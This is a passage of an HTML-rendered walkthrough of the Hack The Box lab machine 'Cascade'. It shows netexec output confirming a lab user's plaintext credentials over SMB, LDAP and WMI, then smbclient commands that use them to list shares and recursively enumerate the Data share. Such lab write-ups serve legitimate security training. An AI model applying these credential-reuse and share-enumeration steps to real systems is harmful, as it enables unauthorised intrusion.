</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">445</span><span class="w">    </span>CASC-DC1<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>cascade.local<span class="se">\r</span>.thompson:rY4n5eva<span class="w"> </span>
</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>
</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ldap<span class="w"> </span>port<span class="w"> </span><span class="m">389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">389</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>ldap<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">445</span><span class="w">    </span>CASC-DC1<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>Build<span class="w"> </span><span class="m">7601</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:CASC-DC1<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:cascade.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>LDAP<span class="w">        </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">389</span><span class="w">    </span>CASC-DC1<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>cascade.local<span class="se">\r</span>.thompson:rY4n5eva<span class="w"> </span>
</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>
</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>rdp<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>rdp<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a>
</span><span id="__span-24-19"><a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>wmi<span class="w"> </span>port<span class="w"> </span><span class="m">135</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-24-20"><a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">135</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>wmi<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-24-21"><a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a>RPC<span class="w">         </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">135</span><span class="w">    </span>CASC-DC1<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>Build<span class="w"> </span><span class="m">7601</span><span class="w"> </span><span class="o">(</span>name:CASC-DC1<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:cascade.local<span class="o">)</span>
</span><span id="__span-24-22"><a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a>RPC<span class="w">         </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">135</span><span class="w">    </span>CASC-DC1<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>cascade.local<span class="se">\r</span>.thompson:rY4n5eva<span class="w"> </span>
</span><span id="__span-24-23"><a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a>
</span><span id="__span-24-24"><a id="__codelineno-24-24" name="__codelineno-24-24" href="#__codelineno-24-24"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>nfs<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-24-25"><a id="__codelineno-24-25" name="__codelineno-24-25" href="#__codelineno-24-25"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>nfs<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-24-26"><a id="__codelineno-24-26" name="__codelineno-24-26" href="#__codelineno-24-26"></a>
</span><span id="__span-24-27"><a id="__codelineno-24-27" name="__codelineno-24-27" href="#__codelineno-24-27"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ssh<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-24-28"><a id="__codelineno-24-28" name="__codelineno-24-28" href="#__codelineno-24-28"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ssh<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-24-29"><a id="__codelineno-24-29" name="__codelineno-24-29" href="#__codelineno-24-29"></a>
</span><span id="__span-24-30"><a id="__codelineno-24-30" name="__codelineno-24-30" href="#__codelineno-24-30"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>vnc<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-24-31"><a id="__codelineno-24-31" name="__codelineno-24-31" href="#__codelineno-24-31"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>vnc<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-24-32"><a id="__codelineno-24-32" name="__codelineno-24-32" href="#__codelineno-24-32"></a>
</span><span id="__span-24-33"><a id="__codelineno-24-33" name="__codelineno-24-33" href="#__codelineno-24-33"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ftp<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-24-34"><a id="__codelineno-24-34" name="__codelineno-24-34" href="#__codelineno-24-34"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ftp<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-24-35"><a id="__codelineno-24-35" name="__codelineno-24-35" href="#__codelineno-24-35"></a>
</span><span id="__span-24-36"><a id="__codelineno-24-36" name="__codelineno-24-36" href="#__codelineno-24-36"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>mssql<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-24-37"><a id="__codelineno-24-37" name="__codelineno-24-37" href="#__codelineno-24-37"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>mssql<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>closed
</span></code></pre></div><br />
so we can login to smb, lets try connecting as <code>r.thompson</code></p>
<h3 id="smb-login-via-rthompson">SMB login via <code>r.thompson</code></h3>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>smbclient<span class="w"> </span>-L<span class="w"> </span>cascade.htb<span class="w"> </span>-U<span class="w"> </span>r.thompson%rY4n5eva
</span></code></pre></div>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>Sharename<span class="w">       </span>Type<span class="w">      </span>Comment
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>---------<span class="w">       </span>----<span class="w">      </span>-------
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>ADMIN$<span class="w">          </span>Disk<span class="w">      </span>Remote<span class="w"> </span>Admin
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>Audit$<span class="w">          </span>Disk<span class="w">      </span>
</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>C$<span class="w">              </span>Disk<span class="w">      </span>Default<span class="w"> </span>share
</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>Data<span class="w">            </span>Disk<span class="w">      </span>
</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>IPC$<span class="w">            </span>IPC<span class="w">       </span>Remote<span class="w"> </span>IPC
</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>NETLOGON<span class="w">        </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>print$<span class="w">          </span>Disk<span class="w">      </span>Printer<span class="w"> </span>Drivers
</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>SYSVOL<span class="w">          </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span></code></pre></div><br />
hm, there are shares like <code>Data</code> that are not the default systemic ones, lets start from there</p>
<h4 id="downloading-and-inspecting-the-smb-shares">Downloading and inspecting the SMB shares</h4>
<p>this will recursively list the shares we have access<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>smbclient<span class="w"> </span>//cascade.htb/Data<span class="w"> </span>-U<span class="w"> </span>r.thompson%rY4n5eva<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse;ls&#39;</span>
</span></code></pre></div></p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="w"> </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Jan<span class="w"> </span><span class="m">26</span><span class="w"> </span><span class="m">22</span>:27:34<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Jan<span class="w"> </span><span class="m">26</span><span class="w"> </span><span class="m">22</span>:27:34<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="w">  </span>Contractors<span class="w">                         </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Jan<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">20</span>:45:11<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="w">  </span>Finance<span class="w">                             </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Jan<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">20</span>:45:06<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="w">  </span>IT<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">13</span>:04:51<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="w">  </span>Production<span class="w">                          </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Jan<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">20</span>:45:18<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="w">  </span>Temps<span class="w">                               </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sun<span class="w"> </span>Jan<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">20</span>:45:15<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>
</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a><span class="se">\C</span>ontractors
</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>NT_STATUS_ACCESS_DENIED<span class="w"> </span>listing<span class="w"> </span><span class="se">\C</span>ontractors<span class="se">\*</span>
</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>
</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a><span class="se">\F</span>inance
</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a>NT_STATUS_ACCESS_DENIED<span class="w"> </span>listing<span class="w"> </span><span class="se">\F</span>inance<span class="se">\*</span>
</span><span id="__span-28-14"><a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a>
</span><span id="__span-28-15"><a id="__codelineno-28-15" name="__codelineno-28-15" href="#__codelineno-28-15"></a><span class="se">\I</span>T
</span><span id="__span-28-16"><a id="__codelineno-28-16" name="__codelineno-28-16" href="#__codelineno-28-16"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">13</span>:04:51<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-17"><a id="__codelineno-28-17" name="__codelineno-28-17" href="#__codelineno-28-17"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">13</span>:04:51<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-18"><a id="__codelineno-28-18" name="__codelineno-28-18" href="#__codelineno-28-18"></a><span class="w">  </span>Email<span class="w"> </span>Archives<span class="w">                      </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">13</span>:00:30<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-19"><a id="__codelineno-28-19" name="__codelineno-28-19" href="#__codelineno-28-19"></a><span class="w">  </span>LogonAudit<span class="w">                          </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">13</span>:04:40<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-20"><a id="__codelineno-28-20" name="__codelineno-28-20" href="#__codelineno-28-20"></a><span class="w">  </span>Logs<span class="w">                                </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">19</span>:53:04<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-21"><a id="__codelineno-28-21" name="__codelineno-28-21" href="#__codelineno-28-21"></a><span class="w">  </span>Temp<span class="w">                                </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">17</span>:06:59<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-22"><a id="__codelineno-28-22" name="__codelineno-28-22" href="#__codelineno-28-22"></a>
</span><span id="__span-28-23"><a id="__codelineno-28-23" name="__codelineno-28-23" href="#__codelineno-28-23"></a><span class="se">\P</span>roduction
</span><span id="__span-28-24"><a id="__codelineno-28-24" name="__codelineno-28-24" href="#__codelineno-28-24"></a>NT_STATUS_ACCESS_DENIED<span class="w"> </span>listing<span class="w"> </span><span class="se">\P</span>roduction<span class="se">\*</span>
</span><span id="__span-28-25"><a id="__codelineno-28-25" name="__codelineno-28-25" href="#__codelineno-28-25"></a>
</span><span id="__span-28-26"><a id="__codelineno-28-26" name="__codelineno-28-26" href="#__codelineno-28-26"></a><span class="se">\T</span>emps
</span><span id="__span-28-27"><a id="__codelineno-28-27" name="__codelineno-28-27" href="#__codelineno-28-27"></a>NT_STATUS_ACCESS_DENIED<span class="w"> </span>listing<span class="w"> </span><span class="se">\T</span>emps<span class="se">\*</span>
</span><span id="__span-28-28"><a id="__codelineno-28-28" name="__codelineno-28-28" href="#__codelineno-28-28"></a>
</span><span id="__span-28-29"><a id="__codelineno-28-29" name="__codelineno-28-29" href="#__codelineno-28-29"></a><span class="se">\I</span>T<span class="se">\E</span>mail<span class="w"> </span>Archives
</span><span id="__span-28-30"><a id="__codelineno-28-30" name="__codelineno-28-30" href="#__codelineno-28-30"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">13</span>:00:30<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-31"><a id="__codelineno-28-31" name="__codelineno-28-31" href="#__codelineno-28-31"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">13</span>:00:30<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-32"><a id="__codelineno-28-32" name="__codelineno-28-32" href="#__codelineno-28-32"></a><span class="w">  </span>Meeting_Notes_June_2018.html<span class="w">       </span>An<span class="w">     </span><span class="m">2522</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">13</span>:00:12<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-33"><a id="__codelineno-28-33" name="__codelineno-28-33" href="#__codelineno-28-33"></a><span class="se">\I</span>T<span class="se">\L</span>ogonAudit
</span><span id="__span-28-34"><a id="__codelineno-28-34" name="__codelineno-28-34" href="#__codelineno-28-34"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">13</span>:04:40<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-35"><a id="__codelineno-28-35" name="__codelineno-28-35" href="#__codelineno-28-35"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">13</span>:04:40<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-36"><a id="__codelineno-28-36" name="__codelineno-28-36" href="#__codelineno-28-36"></a><span class="se">\I</span>T<span class="se">\L</span>ogs
</span><span id="__span-28-37"><a id="__codelineno-28-37" name="__codelineno-28-37" href="#__codelineno-28-37"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">19</span>:53:04<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-38"><a id="__codelineno-28-38" name="__codelineno-28-38" href="#__codelineno-28-38"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">19</span>:53:04<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-39"><a id="__codelineno-28-39" name="__codelineno-28-39" href="#__codelineno-28-39"></a><span class="w">  </span>Ark<span class="w"> </span>AD<span class="w"> </span>Recycle<span class="w"> </span>Bin<span class="w">                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Jan<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">11</span>:33:45<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-40"><a id="__codelineno-28-40" name="__codelineno-28-40" href="#__codelineno-28-40"></a><span class="w">  </span>DCs<span class="w">                                 </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">19</span>:56:00<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-41"><a id="__codelineno-28-41" name="__codelineno-28-41" href="#__codelineno-28-41"></a><span class="se">\I</span>T<span class="se">\T</span>emp
</span><span id="__span-28-42"><a id="__codelineno-28-42" name="__codelineno-28-42" href="#__codelineno-28-42"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">17</span>:06:59<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-43"><a id="__codelineno-28-43" name="__codelineno-28-43" href="#__codelineno-28-43"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">17</span>:06:59<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-44"><a id="__codelineno-28-44" name="__codelineno-28-44" href="#__codelineno-28-44"></a><span class="w">  </span>r.thompson<span class="w">                          </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">17</span>:06:53<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-45"><a id="__codelineno-28-45" name="__codelineno-28-45" href="#__codelineno-28-45"></a><span class="w">  </span>s.smith<span class="w">                             </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">15</span>:00:01<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-46"><a id="__codelineno-28-46" name="__codelineno-28-46" href="#__codelineno-28-46"></a><span class="se">\I</span>T<span class="se">\L</span>ogs<span class="se">\A</span>rk<span class="w"> </span>AD<span class="w"> </span>Recycle<span class="w"> </span>Bin
</span><span id="__span-28-47"><a id="__codelineno-28-47" name="__codelineno-28-47" href="#__codelineno-28-47"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Jan<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">11</span>:33:45<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-48"><a id="__codelineno-28-48" name="__codelineno-28-48" href="#__codelineno-28-48"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Jan<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">11</span>:33:45<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-49"><a id="__codelineno-28-49" name="__codelineno-28-49" href="#__codelineno-28-49"></a><span class="w">  </span>ArkAdRecycleBin.log<span class="w">                 </span>A<span class="w">     </span><span class="m">1303</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">20</span>:19:11<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-50"><a id="__codelineno-28-50" name="__codelineno-28-50" href="#__codelineno-28-50"></a><span class="se">\I</span>T<span class="se">\L</span>ogs<span class="se">\D</span>Cs
</span><span id="__span-28-51"><a id="__codelineno-28-51" name="__codelineno-28-51" href="#__codelineno-28-51"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">19</span>:56:00<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-52"><a id="__codelineno-28-52" name="__codelineno-28-52" href="#__codelineno-28-52"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">19</span>:56:00<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-53"><a id="__codelineno-28-53" name="__codelineno-28-53" href="#__codelineno-28-53"></a><span class="w">  </span>dcdiag.log<span class="w">                          </span>A<span class="w">     </span><span class="m">5967</span><span class="w">  </span>Fri<span class="w"> </span>Jan<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">11</span>:17:30<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-54"><a id="__codelineno-28-54" name="__codelineno-28-54" href="#__codelineno-28-54"></a><span class="se">\I</span>T<span class="se">\T</span>emp<span class="se">\r</span>.thompson
</span><span id="__span-28-55"><a id="__codelineno-28-55" name="__codelineno-28-55" href="#__codelineno-28-55"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">17</span>:06:53<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-56"><a id="__codelineno-28-56" name="__codelineno-28-56" href="#__codelineno-28-56"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">17</span>:06:53<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-57"><a id="__codelineno-28-57" name="__codelineno-28-57" href="#__codelineno-28-57"></a><span class="se">\I</span>T<span class="se">\T</span>emp<span class="se">\s</span>.smith
</span><span id="__span-28-58"><a id="__codelineno-28-58" name="__codelineno-28-58" href="#__codelineno-28-58"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">15</span>:00:01<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-28-59"><a id="__codelineno-28-59" name="__codelineno-28-59" href="#__codelineno-28-59"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">15</span>:00:01<span class="w"> </span><span class="m">2020</span>
